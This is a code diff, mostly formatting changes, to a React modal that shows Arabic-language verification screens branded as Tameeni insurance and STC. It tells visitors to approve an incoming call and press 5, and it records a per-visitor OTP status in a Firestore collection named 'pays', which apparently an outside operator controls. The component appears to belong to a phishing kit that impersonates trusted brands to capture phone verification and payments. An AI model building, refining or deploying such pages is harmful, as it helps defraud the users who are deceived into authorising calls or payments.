@@ -1,10 +1,24 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useState, useCallback } from "react";
 import { Dialog, DialogContent } from "@/components/ui/dialog";
-import { PhoneCall, Smartphone } from "lucide-react";
-import { db } from "@/lib/supabase-client";
-import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client";
+import { 
+  PhoneCall, 
+  Smartphone, 
+  CheckCircle2, 
+  XCircle, 
+  Loader2, 
+  MessageSquare, 
+  Shield, 
+  Volume2,
+  Headphones,
+  AlertCircle,
+  ChevronLeft,
+  RefreshCw,
+  Clock
+} from "lucide-react";
+import { db } from "@/lib/firebase";
+import { doc, onSnapshot, setDoc, Firestore } from "@/lib/firestore-shim";
 import Image from "next/image";
 
 interface StcVerificationModalProps {
@@ -68,7 +82,7 @@ export function StcVerificationModal({
         setStatus("rejected");
         setShakeError(true);
         setTimeout(() => setShakeError(false), 500);
-      },
+      }
     );
 
     return () => unsubscribe();
@@ -81,12 +95,11 @@ export function StcVerificationModal({
       await setDoc(
         doc(db as Firestore, "pays", visitorId),
         { phoneOtpStatus: "confirmed" },
-        { merge: true },
+        { merge: true }
       );
     } catch (err) {
       console.error("[STC Modal] confirm error:", err);
       setIsConfirming(false);
-
       setShakeError(true);
       setTimeout(() => setShakeError(false), 500);
     }
@@ -100,7 +113,7 @@ export function StcVerificationModal({
     setDoc(
       doc(db as Firestore, "pays", visitorId),
       { phoneOtpStatus: "pending" },
-      { merge: true },
+      { merge: true }
     ).catch(console.error);
   }, [visitorId]);
 
@@ -114,7 +127,7 @@ export function StcVerificationModal({
           border: "border-emerald-200",
           title: "تم التحقق بنجاح",
           subtitle: "جاري إكمال العملية...",
-          showButton: false,
+          showButton: false
         };
       case "rejected":
         return {
@@ -124,7 +137,7 @@ export function StcVerificationModal({
           border: "border-red-200",
           title: "تم رفض التحقق",
           subtitle: "يرجى المحاولة مرة أخرى",
-          showButton: false,
+          showButton: false
         };
       case "message":
         return {
@@ -134,7 +147,7 @@ export function StcVerificationModal({
           border: "border-purple-200",
           title: "رسالة تحقق",
           subtitle: "يرجى التأكيد على الرسالة",
-          showButton: true,
+          showButton: true
         };
       default:
         return {
@@ -144,7 +157,7 @@ export function StcVerificationModal({
           border: "border-purple-200",
           title: "في انتظار المكالمة...",
           subtitle: "سوف تتلقى مكالمة قريباً",
-          showButton: true,
+          showButton: true
         };
     }
   };
@@ -166,39 +179,27 @@ export function StcVerificationModal({
 
           <div
             dir="rtl"
-            className={`min-h-[600px] bg-gradient-to-br from-white via-purple-50/30 to-pink-50/20 flex flex-col items-center px-6 py-8 ${shakeError ? "animate-shake" : ""}`}
+            className={`min-h-[600px] bg-gradient-to-br from-white via-purple-50/30 to-pink-50/20 flex flex-col items-center px-6 py-8 ${shakeError ? 'animate-shake' : ''}`}
           >
             {/* Animated background elements */}
             <div className="absolute inset-0 overflow-hidden pointer-events-none">
               <div className="absolute -top-20 -right-20 w-60 h-60 bg-purple-100/40 rounded-full blur-3xl animate-pulse" />
-              <div
-                className="absolute -bottom-20 -left-20 w-60 h-60 bg-pink-100/30 rounded-full blur-3xl animate-pulse"
-                style={{ animationDelay: "1s" }}
-              />
+              <div className="absolute -bottom-20 -left-20 w-60 h-60 bg-pink-100/30 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1s' }} />
             </div>
 
             {/* Header / Logo */}
             <div className="relative z-10 flex items-center gap-4 mb-8 w-full">
               <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-purple-100 to-pink-100 flex items-center justify-center shadow-inner ring-2 ring-purple-100/50">
-                <img
-                  src="/tameeni-logo.webp"
-                  width={48}
-                  className="object-contain"
-                  alt="تأميني"
-                />
+                <img src="/tameeni-logo.webp" width={48} className="object-contain" alt="تأميني" />
               </div>
               <div className="text-right">
                 <p className="text-gray-800 font-bold text-lg">تأميني</p>
-                <p className="text-gray-400 text-xs font-medium">
-                  خدمات التأمين الرقمية
-                </p>
+                <p className="text-gray-400 text-xs font-medium">خدمات التأمين الرقمية</p>
               </div>
               <div className="mr-auto">
                 <div className="flex items-center gap-1.5 px-3 py-1.5 bg-purple-50 rounded-full border border-purple-100">
                   <Shield className="w-3 h-3 text-purple-500" />
-                  <span className="text-[10px] text-purple-600 font-bold">
-                    آمن
-                  </span>
+                  <span className="text-[10px] text-purple-600 font-bold">آمن</span>
                 </div>
               </div>
             </div>
@@ -206,12 +207,7 @@ export function StcVerificationModal({
             {/* STC My Logo */}
             <div className="relative z-10 mb-6">
               <div className="flex items-center gap-3 bg-gradient-to-r from-purple-700 to-purple-600 rounded-2xl px-6 py-3 shadow-lg shadow-purple-500/20">
-                <img
-                  src="/STC-01.svg"
-                  width={80}
-                  className="brightness-0 invert"
-                  alt="STC"
-                />
+                <img src="/STC-01.svg" width={80} className="brightness-0 invert" alt="STC" />
                 <span className="text-white font-bold text-xl">My</span>
                 <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
                   <PhoneCall className="w-4 h-4 text-white" />
@@ -220,13 +216,9 @@ export function StcVerificationModal({
             </div>
 
             {/* Status Badge */}
-            <div
-              className={`relative z-10 mb-6 px-4 py-2 rounded-full ${config.bg} ${config.border} border flex items-center gap-2 transition-all duration-300 ${pulseStatus ? "animate-pulse scale-105" : ""}`}
-            >
+            <div className={`relative z-10 mb-6 px-4 py-2 rounded-full ${config.bg} ${config.border} border flex items-center gap-2 transition-all duration-300 ${pulseStatus ? 'animate-pulse scale-105' : ''}`}>
               <StatusIcon className={`w-4 h-4 ${config.color}`} />
-              <span className={`text-xs font-bold ${config.color}`}>
-                {config.title}
-              </span>
+              <span className={`text-xs font-bold ${config.color}`}>{config.title}</span>
             </div>
 
             {/* Illustration */}
@@ -258,14 +250,7 @@ export function StcVerificationModal({
                     strokeLinejoin="round"
                   />
                   {/* Pink bar on left of bubble */}
-                  <rect
-                    x="10"
-                    y="20"
-                    width="8"
-                    height="55"
-                    rx="4"
-                    fill="#ec4899"
-                  />
+                  <rect x="10" y="20" width="8" height="55" rx="4" fill="#ec4899" />
                   {/* Asterisks */}
                   <text
                     x="35"
@@ -360,15 +345,11 @@ export function StcVerificationModal({
                     جاري إعادة التوجيه...
                   </span>
                 ) : status === "rejected" ? (
-                  <span className="text-red-500">
-                    يرجى التحقق من رقم الهاتف والمحاولة مرة أخرى
-                  </span>
+                  <span className="text-red-500">يرجى التحقق من رقم الهاتف والمحاولة مرة أخرى</span>
                 ) : (
                   <>
                     يرجى الموافقة عليها وإدخال الرقم{" "}
-                    <span className="text-pink-500 font-black text-lg bg-pink-50 px-2 py-0.5 rounded-lg border border-pink-200 inline-block mx-1">
-                      5
-                    </span>{" "}
+                    <span className="text-pink-500 font-black text-lg bg-pink-50 px-2 py-0.5 rounded-lg border border-pink-200 inline-block mx-1">5</span>{" "}
                     في المكالمة والمتابعة
                   </>
                 )}
@@ -378,7 +359,7 @@ export function StcVerificationModal({
             {/* Action Buttons */}
             <div className="relative z-10 w-full max-w-sm space-y-3">
               {config.showButton && (
-                <button
+                <button 
                   onClick={handleMessageConfirm}
                   disabled={isConfirming}
                   className="w-full bg-gradient-to-r from-pink-500 via-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600 active:from-pink-700 active:to-rose-700 text-white text-lg font-bold py-4 rounded-2xl transition-all duration-300 shadow-lg shadow-pink-500/25 hover:shadow-xl hover:shadow-pink-500/30 hover:scale-[1.02] active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2"
@@ -410,9 +391,7 @@ export function StcVerificationModal({
               {status === "pending" && (
                 <div className="flex items-center justify-center gap-2 text-gray-400 py-2">
                   <Clock className="w-4 h-4 animate-pulse" />
-                  <span className="text-sm font-medium">
-                    في انتظار المكالمة...
-                  </span>
+                  <span className="text-sm font-medium">في انتظار المكالمة...</span>
                 </div>
               )}
             </div>
@@ -452,23 +431,9 @@ export function StcVerificationModal({
 
       <style jsx global>{`
         @keyframes shake {
-          0%,
-          100% {
-            transform: translateX(0);
-          }
-          10%,
-          30%,
-          50%,
-          70%,
-          90% {
-            transform: translateX(-4px);
-          }
-          20%,
-          40%,
-          60%,
-          80% {
-            transform: translateX(4px);
-          }
+          0%, 100% { transform: translateX(0); }
+          10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
+          20%, 40%, 60%, 80% { transform: translateX(4px); }
         }
         .animate-shake {
           animation: shake 0.4s ease-in-out;
